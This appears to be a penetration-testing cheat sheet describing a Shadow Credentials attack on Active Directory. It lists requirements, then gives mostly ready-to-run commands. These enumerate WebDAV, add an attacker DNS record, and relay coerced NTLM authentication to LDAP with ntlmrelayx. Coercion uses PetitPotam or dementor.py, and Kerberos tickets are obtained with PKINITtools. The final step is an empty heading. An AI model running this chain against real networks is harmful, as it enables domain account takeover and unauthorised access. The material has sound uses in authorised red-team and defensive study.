# Shadow Credentials Attack

## Shadow Credentials Attack [t-ad-ntlm-coerced-webdav_shadow_credentials]

Users or computer accounts can have several key credentials which could correspond to different devices. 
The information is stored in the msDS-KeyCredentialLink active directory attribute and was introduced in 
Windows Server 2016 and Windows 10 1703 (Windows Hello new attack surface).

Requirements:
Domain should support PKINIT and contain at least one Domain Controller running Windows Server 2016 or above.
Domain Controller should have its own key pair (for the session key exchange) (e.g. happens when AD CS is enabled 
or when a certificate authority (CA) is in place).
The attacker`s host should have a valid DNS entry (it`s also possible to use spoofing techniques)
WebClient service should be installed and running (by default the service is not installed on servers, 
so in most cases it works just for workstations)


### 1.1 Check for enabled webdav services



{% code overflow="wrap" %}
```bash
crackmapexec smb smb_hosts.txt -u user -d domain.com -p 'P@ssw0rd' -M webdav
```
{% endcode %}

### 1.2 Create a new DNS record in the AD



{% code overflow="wrap" %}
```bash
dnstool.py -u 'domain.com\user' -p 'Password123' --record 'shadow' --action add --data <attackers_ip> dc01.domain.com
```
{% endcode %}

{% hint style="info" %}it takes some time to update, wait for 5 minutes or so

{% endhint %}

### 1.3 Prepare a tool to relay the authentication request



{% code overflow="wrap" %}
```bash
impacket-ntlmrelayx -t ldap://dc02.hpbank.local --shadow-credentials --shadow-target adcs\$
```
{% endcode %}

### 1.4 Force the target host to authenticate using WebDAV (http request)




**option 1: dementor.py**

{% code overflow="wrap" %}
```bash
python2 dementor.py -d hpbank.local -u da -p 'P@ssw0rd' shadow@80/test.txt <target_hostname>
```
{% endcode %}


**option 2: PetitPotam.py (topotam)**

{% code overflow="wrap" %}
```bash
PetitPotam.py -u da -p 'P@ssw0rd' -d domain.local shadow@80/test.txt <target.domain.local> -pipe all
```
{% endcode %}

### 1.5 Request a TGT using the PFX file received from the impacket-ntlmrelayx tool



{% code overflow="wrap" %}
```bash
gettgtpkinit.py -cert-pfx <certname.pfx> -pfx-pass <pfx_pass> domain.com/servername$ <cachefile.ccache>
```
{% endcode %}

### 1.6 Request a service ticket that is valid on the host for which you've obtained a certificate



{% code overflow="wrap" %}
```bash
python3 PKINITtools/gets4uticket.py kerberos+ccache://hpbank.local\adcs\$:7KJqDL8U.ccache@dc01.hpbank.local cifs/adcs.hpbank.local
```
{% endcode %}

### 1.7 Use any tool supported kerberos auth



